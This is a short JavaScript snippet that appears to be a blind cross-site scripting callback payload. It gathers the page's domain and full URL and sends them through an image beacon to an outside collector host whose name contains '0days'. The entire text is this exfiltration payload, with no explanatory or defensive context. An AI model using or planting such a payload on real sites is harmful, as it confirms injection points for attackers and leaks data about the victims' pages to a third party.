// Build a simple string of data
var info = "dom=" + encodeURIComponent(document.domain) + 
           "&url=" + encodeURIComponent(location.href);

// Send it as a URL parameter (GET request)
new Image().src = "https://aged-cloud-b431.0days.workers.dev/w/8c12613f5acfd286-jab7ncdwl?" + info;
